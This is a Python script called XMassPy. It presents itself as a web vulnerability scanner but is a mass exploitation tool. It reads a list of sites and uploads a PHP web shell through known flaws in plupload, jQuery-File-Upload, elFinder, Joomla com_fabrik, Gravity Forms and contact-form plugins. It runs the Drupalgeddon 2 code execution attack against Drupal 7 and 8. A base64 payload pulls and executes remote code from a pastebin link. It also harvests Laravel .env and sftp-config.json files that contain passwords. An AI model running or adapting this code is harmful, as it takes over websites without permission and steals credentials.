#!/usr/bin/env python3
# Description : XMassPy
# Author : Koboi137 ( Backbox Indonesia )

from datetime import datetime
from time import sleep
import requests, sys, urllib, urllib3, threading
import os, base64, re, json, subprocess, argparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Парсер аргументов
parser = argparse.ArgumentParser(description="XMassPy - Web Vulnerability Scanner")
parser.add_argument("--input", default="domain.txt", help="Input file with target URLs (default: domain.txt)")
parser.add_argument("--output", default="results.json", help="Output file for results (default: results.json)")
parser.add_argument("--verbose", action="store_true", help="Enable verbose output for debugging")
args = parser.parse_args()

# Читаем список целей
try:
    with open(args.input, 'r') as file:
        targets = [line.strip() for line in file if line.strip()]
    if not targets:
        print(f"Error: Input file {args.input} is empty.")
        sys.exit(1)
except FileNotFoundError:
    print(f"Error: Input file {args.input} not found.")
    sys.exit(1)

# Проверяем наличие more.php
if not os.path.exists("more.php"):
    print("Error: more.php not found in working directory.")
    sys.exit(1)

user_agent = {'User-agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'}
os.system('export LD_PRELOAD=/lib/x86_64-linux-gnu/libgcc_s.so.1')
x = subprocess.getoutput('ulimit -n')
if int(x) <= 16384:
    subprocess.getoutput('ulimit -n 16384')


class cl:
    green = '\033[92m'
    red = '\033[91m'
    end = '\033[0m'


def sizeof(num, suffix='B'):
    for unit in [' ', 'K', 'M', 'G', 'T', 'P', 'E', 'Z']:
        if abs(num) < 1024.0:
            return ('{:>4} {}{}'.format(format(num, '.3g'), unit, suffix))
        num /= 1024.0


# Список для хранения результатов
results = []


def save_result(url, status, size, timestamp, error=None):
    """Сохраняем результат в глобальный список"""
    result = {
        "url": url,
        "status": status,
        "size": size
    }
    if error:
        result["error"] = error
        return
    if status == "failed":
        return
    results.append(result)


def plupload(line):
    try:
        url = '{}plupload/examples/upload.php'.format(line)
        hsl = '{}plupload/examples/uploads/more.php'.format(line)
        r = requests.post(url, files={'file': open('more.php', 'rb')}, headers=user_agent, timeout=5, verify=False)
        ox = requests.get(hsl, headers=user_agent, timeout=5, verify=False)
        oxs = ox.status_code
        oxt = ox.text
        num = int(len(ox.text))
        timestamp = datetime.now().strftime('%H:%M:%S')
        if oxs == 200 and 'webadmin.php' in oxt:
            print(f"{cl.green}| {timestamp} | {oxs} - {sizeof(num)} | {hsl}{cl.end}")
            save_result(hsl, oxs, sizeof(num), timestamp)
        elif args.verbose:
            print(f"{cl.red}| {timestamp} | Failed plupload: {hsl} (Status: {oxs}){cl.end}")
    except Exception as e:
        if args.verbose:
            timestamp = datetime.now().strftime('%H:%M:%S')
            print(f"{cl.red}| {timestamp} | Error in plupload: {hsl} - {str(e)}{cl.end}")
            save_result(hsl, "failed", "0", timestamp, str(e))


def jquery(line, exp, shl):
    try:
        url = '{}{}'.format(line, exp)
        hsl = '{}{}'.format(line, shl)
        r = requests.post(url, files={'files[]': open('more.php', 'rb')}, headers=user_agent, timeout=5, verify=False)
        ox = requests.get(hsl, headers=user_agent, timeout=5, verify=False)
        oxs = ox.status_code
        oxt = ox.text
        num = int(len(ox.text))
        timestamp = datetime.now().strftime('%H:%M:%S')
        if oxs == 200 and 'webadmin.php' in oxt:
            print(f"{cl.green}| {timestamp} | {oxs} - {sizeof(num)} | {hsl}{cl.end}")
            save_result(hsl, oxs, sizeof(num), timestamp)
        elif args.verbose:
            print(f"{cl.red}| {timestamp} | Failed jquery: {hsl} (Status: {oxs}){cl.end}")
    except Exception as e:
        if args.verbose:
            timestamp = datetime.now().strftime('%H:%M:%S')
            print(f"{cl.red}| {timestamp} | Error in jquery: {hsl} - {str(e)}{cl.end}")
            save_result(hsl, "failed", "0", timestamp, str(e))


def jqupload(line):
    paths = [
        ('assets/js/plugins/jquery-file-upload/server/php/',
         'assets/js/plugins/jquery-file-upload/server/php/files/more.php'),
        ('assets/global/plugins/jquery-file-upload/server/php/',
         'assets/global/plugins/jquery-file-upload/server/php/files/more.php'),
        ('js/plugins/jquery-file-upload/server/php/', 'js/plugins/jquery-file-upload/server/php/files/more.php'),
        ('js/jquery-file-upload/server/php/', 'js/jquery-file-upload/server/php/files/more.php'),
        ('assets/js/plugins/jQuery-File-Upload/server/php/',
         'assets/js/plugins/jQuery-File-Upload/server/php/files/more.php'),
        ('assets/global/plugins/jQuery-File-upload/server/php/',
         'assets/global/plugins/jQuery-File-upload/server/php/files/more.php'),
        ('js/plugins/jQuery-File-Upload/server/php/', 'js/plugins/jQuery-File-Upload/server/php/files/more.php'),
        ('js/jQuery-File-Upload/server/php/', 'js/jQuery-File-Upload/server/php/files/more.php'),
        ('server/php/', 'server/php/files/more.php'),
        ('components/com_sexycontactform/fileupload/index.php',
         'components/com_sexycontactform/fileupload/files/more.php'),
        ('joomla/components/com_sexycontactform/fileupload/index.php',
         'joomla/components/com_sexycontactform/fileupload/files/more.php'),
        ('components/com_creativecontactform/fileupload/index.php',
         'components/com_creativecontactform/fileupload/files/more.php'),
        ('joomla/components/com_creativecontactform/fileupload/index.php',
         'joomla/components/com_creativecontactform/fileupload/files/more.php'),
        ('wp-content/plugins/sexy-contact-form/includes/fileupload/index.php',
         'wp-content/plugins/sexy-contact-form/includes/fileupload/files/more.php'),
        ('wp/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php',
         'wp/wp-content/plugins/sexy-contact-form/includes/fileupload/files/more.php'),
        ('wordpress/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php',
         'wordpress/wp-content/plugins/sexy-contact-form/includes/fileupload/files/more.php'),
        ('blog/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php',
         'blog/wp-content/plugins/sexy-contact-form/includes/fileupload/files/more.php')
    ]
    for exp, shl in paths:
        jquery(line, exp, shl)


def laraenv(line):
    try:
        url = '{}.env'.format(line)
        r = requests.get(url, headers=user_agent, timeout=5, verify=False)
        rs = r.status_code
        num = int(len(r.text))
        psw = r.text
        timestamp = datetime.now().strftime('%H:%M:%S')
        if rs == 200 and 'PASSWORD' in psw:
            print(f"{cl.green}| {timestamp} | {rs} - {sizeof(num)} | {url}{cl.end}")
            save_result(url, rs, sizeof(num), timestamp)
        elif args.verbose:
            print(f"{cl.red}| {timestamp} | Failed laraenv: {url} (Status: {rs}){cl.end}")
    except Exception as e:
        if args.verbose:
            timestamp = datetime.now().strftime('%H:%M:%S')
            print(f"{cl.red}| {timestamp} | Error in laraenv: {url} - {str(e)}{cl.end}")
            save_result(url, "failed", "0", timestamp, str(e))


def sftpconf(line):
    try:
        url = '{}sftp-config.json'.format(line)
        r = requests.get(url, headers=user_agent, timeout=5, verify=False)
        rs = r.status_code
        num = int(len(r.text))
        psw = r.text
        timestamp = datetime.now().strftime('%H:%M:%S')
        if rs == 200 and 'password' in psw:
            print(f"{cl.green}| {timestamp} | {rs} - {sizeof(num)} | {url}{cl.end}")
            save_result(url, rs, sizeof(num), timestamp)
        elif args.verbose:
            print(f"{cl.red}| {timestamp} | Failed sftpconf: {url} (Status: {rs}){cl.end}")
    except Exception as e:
        if args.verbose:
            timestamp = datetime.now().strftime('%H:%M:%S')
            print(f"{cl.red}| {timestamp} | Error in sftpconf: {url} - {str(e)}{cl.end}")
            save_result(url, "failed", "0", timestamp, str(e))


def wpregister(line):
    try:
        url = '{}wp-login.php?action=register'.format(line)
        r = requests.get(url, headers=user_agent, timeout=5, verify=False)
        rs = r.status_code
        num = int(len(r.text))
        timestamp = datetime.now().strftime('%H:%M:%S')
        if 'message register' in r.text:
            print(f"{cl.green}| {timestamp} | {rs} - {sizeof(num)} | {url}{cl.end}")
            save_result(url, rs, sizeof(num), timestamp)
        elif args.verbose:
            print(f"{cl.red}| {timestamp} | Failed wpregister: {url} (Status: {rs}){cl.end}")
    except Exception as e:
        if args.verbose:
            timestamp = datetime.now().strftime('%H:%M:%S')
            print(f"{cl.red}| {timestamp} | Error in wpregister: {url} - {str(e)}{cl.end}")
            save_result(url, "failed", "0", timestamp, str(e))


def elfinder(line, exp):
    try:
        urlx = line + exp + '/php/connector.php'
        mkfile = requests.get('{}{}/php/connector.php?cmd=mkfile&name=more.php&target=l1_Lw'.format(line, exp),
                              headers=user_agent, timeout=5, verify=False)
        trgt = 'l1_' + base64.b64encode(b'more.php').decode('utf-8')
        upl = base64.b64decode(
            b'PD9waHAgZXZhbCgiPz4iLmZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvQ3VyUXJIMWEiKSk7ID8+').decode(
            'utf-8')
        post = {'cmd': 'put', 'target': trgt, 'content': upl}
        exp1 = requests.post(urlx, data=post, headers=user_agent, timeout=5, verify=False)
        exp2 = requests.post(urlx + '?cmd=upload', data={'current': 'ebb01746fc058386b639c18ea6a2b1f1'},
                             files={'upload[]': open('more.php', 'rb')}, headers=user_agent, timeout=5, verify=False)
        exp3 = requests.post(urlx + '?cmd=upload', data={'current': '8ea8853cb93f2f9781e0bf6e857015ea'},
                             files={'upload[]': open('more.php', 'rb')}, headers=user_agent, timeout=5, verify=False)
        psh = line + exp + '/files/more.php'
        cek = requests.get(psh, headers=user_agent, timeout=5, verify=False)
        ceks = cek.status_code
        num = int(len(cek.text))
        timestamp = datetime.now().strftime('%H:%M:%S')
        if ceks == 200 and 'webadmin.php' in cek.text:
            print(f"{cl.green}| {timestamp} | {ceks} - {sizeof(num)} | {psh}{cl.end}")
            save_result(psh, ceks, sizeof(num), timestamp)
        elif args.verbose:
            print(f"{cl.red}| {timestamp} | Failed elfinder: {psh} (Status: {ceks}){cl.end}")
        psh2 = line + 'files/more.php'
        cek2 = requests.get(psh2, headers=user_agent, timeout=5, verify=False)
        ceks2 = cek2.status_code
        num2 = int(len(cek2.text))
        if ceks2 == 200 and 'webadmin.php' in cek2.text:
            timestamp = datetime.now().strftime('%H:%M:%S')
            print(f"{cl.green}| {timestamp} | {ceks2} - {sizeof(num2)} | {psh2}{cl.end}")
            save_result(psh2, ceks2, sizeof(num2), timestamp)
        elif args.verbose:
            print(f"{cl.red}| {timestamp} | Failed elfinder: {psh2} (Status: {ceks2}){cl.end}")
    except Exception as e:
        if args.verbose:
            timestamp = datetime.now().strftime('%H:%M:%S')
            print(f"{cl.red}| {timestamp} | Error in elfinder: {psh} - {str(e)}{cl.end}")
            save_result(psh, "failed", "0", timestamp, str(e))


def exfinder(line):
    elfinder(line, 'elFinder')
    elfinder(line, 'elfinder')


def drupal7(target):
    try:
        verify = True
        cmd = 'echo PD9waHAgZXZhbCgiPz4iLmZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvQ3VyUXJIMWEiKSk7ID8+ | base64 -d | tee ./x7.php ./sites/default/x7.php ./sites/default/files/x7.php'
        url = target + '?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=' + cmd
        data = {'form_id': 'user_pass', '_triggering_element_name': 'name'}
        req = requests.post(url, data=data, headers=user_agent, verify=verify, timeout=5)
        patern = re.compile('<input type="hidden" name="form_build_id" value="(.+?)" />')
        form = re.findall(patern, req.text)
        url2 = target + '?q=file/ajax/name/%23value/' + form[0]
        post = {'form_build_id': form[0]}
        send = requests.post(url2, data=post, headers=user_agent, timeout=5)
        get1 = requests.get(target + 'x7.php', headers=user_agent, timeout=5)
        get2 = requests.get(target + 'sites/default/x7.php', headers=user_agent, timeout=5)
        get3 = requests.get(target + 'sites/default/files/x7.php', headers=user_agent, timeout=5)
        timestamp = datetime.now().strftime('%H:%M:%S')
        if get1.status_code == 200 and 'webadmin.php' in get1.text:
            print(
                f"{cl.green}| {timestamp} | {get1.status_code} - {sizeof(int(len(get1.text)))} | {target}x7.php{cl.end}")
            save_result(target + 'x7.php', get1.status_code, sizeof(int(len(get1.text))), timestamp)
        elif args.verbose:
            print(f"{cl.red}| {timestamp} | Failed drupal7: {target}x7.php (Status: {get1.status_code}){cl.end}")
        if get2.status_code == 200 and 'webadmin.php' in get2.text:
            timestamp = datetime.now().strftime('%H:%M:%S')
            print(
                f"{cl.green}| {timestamp} | {get2.status_code} - {sizeof(int(len(get2.text)))} | {target}sites/default/x7.php{cl.end}")
            save_result(target + 'sites/default/x7.php', get2.status_code, sizeof(int(len(get2.text))), timestamp)
        elif args.verbose:
            print(
                f"{cl.red}| {timestamp} | Failed drupal7: {target}sites/default/x7.php (Status: {get2.status_code}){cl.end}")
        if get3.status_code == 200 and 'webadmin.php' in get3.text:
            timestamp = datetime.now().strftime('%H:%M:%S')
            print(
                f"{cl.green}| {timestamp} | {get3.status_code} - {sizeof(int(len(get3.text)))} | {target}sites/default/files/x7.php{cl.end}")
            save_result(target + 'sites/default/files/x7.php', get3.status_code, sizeof(int(len(get3.text))), timestamp)
        elif args.verbose:
            print(
                f"{cl.red}| {timestamp} | Failed drupal7: {target}sites/default/files/x7.php (Status: {get3.status_code}){cl.end}")
    except Exception as e:
        if args.verbose:
            timestamp = datetime.now().strftime('%H:%M:%S')
            print(f"{cl.red}| {timestamp} | Error in drupal7: {target} - {str(e)}{cl.end}")
            save_result(target, "failed", "0", timestamp, str(e))


def drupal8(target):
    try:
        verify = True
        cmd = 'echo PD9waHAgZXZhbCgiPz4iLmZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvQ3VyUXJIMWEiKSk7ID8+ | base64 -d | tee ./x8.php ./sites/default/x8.php ./sites/default/files/x8.php'
        url = target + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
        payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec',
                   'mail[#type]': 'markup', 'mail[#markup]': cmd}
        req = requests.post(url, data=payload, headers=user_agent, verify=verify, timeout=5)
        get1 = requests.get(target + 'x8.php', headers=user_agent, timeout=5)
        get2 = requests.get(target + 'sites/default/x8.php', headers=user_agent, timeout=5)
        get3 = requests.get(target + 'sites/default/files/x8.php', headers=user_agent, timeout=5)
        timestamp = datetime.now().strftime('%H:%M:%S')
        if get1.status_code == 200 and 'webadmin.php' in get1.text:
            print(
                f"{cl.green}| {timestamp} | {get1.status_code} - {sizeof(int(len(get1.text)))} | {target}x8.php{cl.end}")
            save_result(target + 'x8.php', get1.status_code, sizeof(int(len(get1.text))), timestamp)
        elif args.verbose:
            print(f"{cl.red}| {timestamp} | Failed drupal8: {target}x8.php (Status: {get1.status_code}){cl.end}")
        if get2.status_code == 200 and 'webadmin.php' in get2.text:
            timestamp = datetime.now().strftime('%H:%M:%S')
            print(
                f"{cl.green}| {timestamp} | {get2.status_code} - {sizeof(int(len(get2.text)))} | {target}sites/default/x8.php{cl.end}")
            save_result(target + 'sites/default/x8.php', get2.status_code, sizeof(int(len(get2.text))), timestamp)
        elif args.verbose:
            print(
                f"{cl.red}| {timestamp} | Failed drupal8: {target}sites/default/x8.php (Status: {get2.status_code}){cl.end}")
        if get3.status_code == 200 and 'webadmin.php' in get3.text:
            timestamp = datetime.now().strftime('%H:%M:%S')
            print(
                f"{cl.green}| {timestamp} | {get3.status_code} - {sizeof(int(len(get3.text)))} | {target}sites/default/files/x8.php{cl.end}")
            save_result(target + 'sites/default/files/x8.php', get3.status_code, sizeof(int(len(get3.text))), timestamp)
        elif args.verbose:
            print(
                f"{cl.red}| {timestamp} | Failed drupal8: {target}sites/default/files/x8.php (Status: {get3.status_code}){cl.end}")
    except Exception as e:
        if args.verbose:
            timestamp = datetime.now().strftime('%H:%M:%S')
            print(f"{cl.red}| {timestamp} | Error in drupal8: {target} - {str(e)}{cl.end}")
            save_result(target, "failed", "0", timestamp, str(e))


def comfabrik(line):
    try:
        url = line + 'index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload'
        files = {'file': open('more.php', 'rb')}
        r = requests.post(url, files=files, headers=user_agent, verify=False, timeout=5)
        content = r.content
        jso = json.loads(content)
        shel = jso['uri']
        req = requests.get(shel)
        timestamp = datetime.now().strftime('%H:%M:%S')
        if req.status_code == 200 and 'webadmin.php' in req.text:
            print(f"{cl.green}| {timestamp} | {req.status_code} - {sizeof(int(len(req.text)))} | {shel}{cl.end}")
            save_result(shel, req.status_code, sizeof(int(len(req.text))), timestamp)
        elif args.verbose:
            print(f"{cl.red}| {timestamp} | Failed comfabrik: {shel} (Status: {req.status_code}){cl.end}")
    except Exception as e:
        if args.verbose:
            timestamp = datetime.now().strftime('%H:%M:%S')
            print(f"{cl.red}| {timestamp} | Error in comfabrik: {url} - {str(e)}{cl.end}")
            save_result(url, "failed", "0", timestamp, str(e))


def gravityform(line):
    try:
        url = line + '?gf_page=upload'
        she = [line + 'wp-content/_input_3_more.php5']
        she.append(line + 'wp-content/uploads/_input_3_more.php5')
        she.append(line + 'wp-content/uploads/gravity_forms/_input_3_more.php5')
        data = b'<?php eval("?>".file_get_contents("https://pastebin.com/raw/CurQrH1a")); ?>&field_id=3&form_id=1&gform_unique_id=../../../../&name=more.php5'
        r = urllib.request.urlopen(url, data=data)
        for shl in she:
            csh = requests.get(shl)
            if csh.status_code == 200 and 'webadmin.php' in csh.text:
                timestamp = datetime.now().strftime('%H:%M:%S')
                print(f"{cl.green}| {timestamp} | {csh.status_code} - {sizeof(int(len(csh.text)))} | {shl}{cl.end}")
                save_result(shl, csh.status_code, sizeof(int(len(csh.text))), timestamp)
            elif args.verbose:
                print(f"{cl.red}| {timestamp} | Failed gravityform: {shl} (Status: {csh.status_code}){cl.end}")
    except Exception as e:
        if args.verbose:
            timestamp = datetime.now().strftime('%H:%M:%S')
            print(f"{cl.red}| {timestamp} | Error in gravityform: {url} - {str(e)}{cl.end}")
            save_result(url, "failed", "0", timestamp, str(e))


def rikues(line):
    if args.verbose:
        timestamp = datetime.now().strftime('%H:%M:%S')
        print(f"| {timestamp} | Starting scan for: {line}")
    plupload(line)
    laraenv(line)
    laraenv(line + 'laravel/')
    sftpconf(line)
    wpregister(line)
    wpregister(line + 'wp/')
    wpregister(line + 'wordpress/')
    wpregister(line + 'blog/')
    jqupload(line)
    exfinder(line)
    drupal7(line)
    drupal7(line + 'drupal/')
    drupal8(line)
    drupal8(line + 'drupal/')
    comfabrik(line)
    comfabrik(line + 'joomla/')
    gravityform(line)
    gravityform(line + 'wp/')
    gravityform(line + 'wordpress/')
    gravityform(line + 'blog/')


def main():
    print('__  ____  __               ____')
    print('\ \/ /  \/  | __ _ ___ ___|  _ \ _   _')
    print(' \  /| |\/| |/ _` / __/ __| |_) | | | |')
    print(' /  \| |  | | (_| \__ \__ \  __/| |_| |')
    print('/_/\_\_|  |_|\__,_|___/___/_|    \__, |')
    print('                                 |___/ \n')
    print('Backbox Indonesia (c) 2018\n')
    print('Start scanning...')
    print('===============================================================================')
    print('| Time     | Status | Size | URL                                              |')
    print('===============================================================================')

    no = 0
    lcount = len(targets)
    threads = []
    for line in targets:
        try:
            t = threading.Thread(target=rikues, args=(line,))
            threads.append(t)
            t.start()
            no += 1
            progress = (no * 100) // lcount
            print(f"| {datetime.now().strftime('%H:%M:%S')} | Progress: {progress}% | Line: {no} | Scanning: {line}")
        except (KeyboardInterrupt, SystemExit):
            print(f"\r| {datetime.now().strftime('%H:%M:%S')} | Exiting program ...")
            os.system(f'kill -9 {os.getpid()}')

    # Ждем завершения всех потоков
    for t in threads:
        t.join()

    with open(args.output, 'w') as f:
        json.dump(results, f, indent=4)

    print(f"\nResults saved to {args.output} and {args.output.replace('.json', '.txt')}")
    print('===============================================================================')
    print("Summary of results:")
    print(json.dumps(results, indent=4))


if __name__ == "__main__":
    main()
